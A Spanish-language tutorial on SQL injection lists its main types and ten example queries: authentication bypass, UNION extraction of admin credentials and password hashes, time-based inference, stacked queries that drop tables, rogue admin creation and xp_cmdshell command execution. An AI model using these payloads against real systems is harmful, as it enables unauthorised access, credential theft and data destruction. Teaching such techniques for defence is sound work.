# Inyección SQL (SQLI)

La inyección SQL (SQLI) es una técnica de ataque utilizada para explotar vulnerabilidades en aplicaciones web que no validan adecuadamente la entrada del usuario en las consultas SQL enviadas a la base de datos. Este tipo de ataque puede permitir a los atacantes acceder a información confidencial, modificar datos o incluso tomar el control de la base de datos.

## Tipos de Inyección SQL

1. **Basada en errores**: Aprovecha los mensajes de error generados por la base de datos para obtener información sobre su estructura.
2. **Basada en tiempo**: Utiliza consultas que introducen retrasos para inferir información mediante análisis de tiempos de respuesta.
3. **Basada en booleanos**: Emplea expresiones booleanas para determinar si ciertas condiciones son verdaderas o falsas.
4. **Basada en uniones**: Combina resultados de múltiples consultas utilizando la cláusula `UNION`.
5. **Basada en consultas apiladas (stacked queries)**: Permite ejecutar múltiples consultas en una sola instrucción.

## Ejemplos prácticos y explicados

### 1. Bypass de autenticación
```sql
SELECT * FROM usuarios WHERE usuario = 'admin' AND contraseña = '' OR '1'='1';
```
 Esta consulta siempre será verdadera debido a la condición `'1'='1'`, permitiendo el acceso sin credenciales válidas.

### 2. Extracción de datos
```sql
SELECT nombre, correo FROM clientes WHERE id = 1 UNION SELECT usuario, contraseña FROM administradores;
```
 Combina datos de dos tablas diferentes, exponiendo información sensible de los administradores.

### 3. Inyección basada en tiempo
```sql
SELECT * FROM productos WHERE id = 1 AND IF(SUBSTRING(nombre,1,1) = 'A', SLEEP(5), 0);
```
 Si la primera letra del nombre del producto es 'A', la consulta se retrasará 5 segundos, permitiendo extraer datos mediante análisis de tiempos.

### 4. Eliminación de datos
```sql
DELETE FROM usuarios WHERE id = 1; DROP TABLE pedidos;-- 
```
 Elimina un usuario específico y luego borra la tabla `pedidos`, causando pérdida de datos.

### 5. Creación de un usuario malicioso
```sql
INSERT INTO usuarios (usuario, contraseña, rol) VALUES ('hacker', '1234', 'admin');
```
 Inserta un nuevo usuario con privilegios de administrador en la base de datos.

### 6. Escalada de privilegios
```sql
UPDATE usuarios SET rol = 'admin' WHERE usuario = 'victima';
```
Cambia el rol de un usuario existente a administrador, otorgándole privilegios elevados.

### 7. Evasión de filtros básicos
```sql
SELECT * FROM productos WHERE nombre = 'zapato' OR 'a'='a';--';
```
Utiliza comentarios y condiciones siempre verdaderas para evadir filtros básicos de entrada.

### 8. Inyección en procedimientos almacenados
```sql
EXECUTE sp_executesql N'SELECT * FROM usuarios WHERE usuario = ''admin''; DROP TABLE logs;--';
```
Explota procedimientos almacenados para ejecutar múltiples comandos maliciosos.

### 9. Robo de hashes de contraseñas
```sql
SELECT usuario, contraseña FROM usuarios WHERE id = 1 UNION SELECT usuario, hash FROM contraseñas;
```
Extrae hashes de contraseñas almacenados en una tabla separada.

### 10. Inyección en consultas dinámicas
```sql
SELECT * FROM productos WHERE categoria = '' OR 1=1; EXEC xp_cmdshell(''whoami'');--';
```
Inyecta comandos del sistema operativo mediante funciones extendidas como `xp_cmdshell` en SQL Server.

## Tipos de bases de datos y vulnerabilidades

1. **Bases de datos relacionales**: MySQL, SQL Server, Oracle, PostgreSQL. Son las más afectadas por inyecciones SQL.
2. **Bases de datos NoSQL**: Aunque no usan SQL, pueden ser vulnerables a inyecciones de comandos (e.g., MongoDB).
3. **Bases de datos de grafos**: Neo4j puede ser vulnerable a inyecciones en sus consultas de grafos.
4. **Bases de datos de objetos**: db4o puede ser explotada mediante inyecciones en las consultas de objetos.

